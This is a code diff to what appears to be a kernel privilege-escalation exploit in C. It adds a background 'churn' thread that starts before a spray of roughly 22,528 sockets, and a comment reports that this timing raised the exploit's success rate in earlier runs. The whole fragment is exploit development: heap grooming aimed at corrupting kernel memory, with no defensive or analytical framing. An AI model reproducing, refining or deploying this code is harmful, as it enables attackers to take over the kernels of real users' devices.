@@ -192,6 +192,17 @@ kern_return_t cs2_pe_v1(void) {
         uint64_t leeway = 4096 * 2;        // I have no idea
         // maxfiles - leeway = 22528 -> 0x5800 aka CS2_MAX_SOCKETS_COUNT, why
         // this limit seems arbitrary?
+        /* LSWARM-CHURN phase fix (2026-11-15 receipts): the winning runs
+           had the OTHER lane's churn spraying while cs2's own 22528-socket
+           spray landed. Starting churn only after the spray reproduced
+           the old 0-success state. Churn must be live BEFORE the spray and
+           through the scan — the spray must allocate into an active churn. */
+        if (!g_cs2_churn_go) {
+            g_cs2_churn_go = 1;
+            if (pthread_create(&g_cs2_churn_tid, NULL, cs2_churn_worker, NULL) == 0)
+                LOG("[churn] cs2 churn thread started BEFORE the spray");
+            else { g_cs2_churn_go = 0; LOG_ERR("[churn] pthread_create failed — scan without churn"); }
+        }
         // spray sockets, save pcb gencnt
         for (uint64_t socket_count = 0; socket_count < (maxfiles - leeway); socket_count++) {
             uint64_t port = cs2_spray_socket();
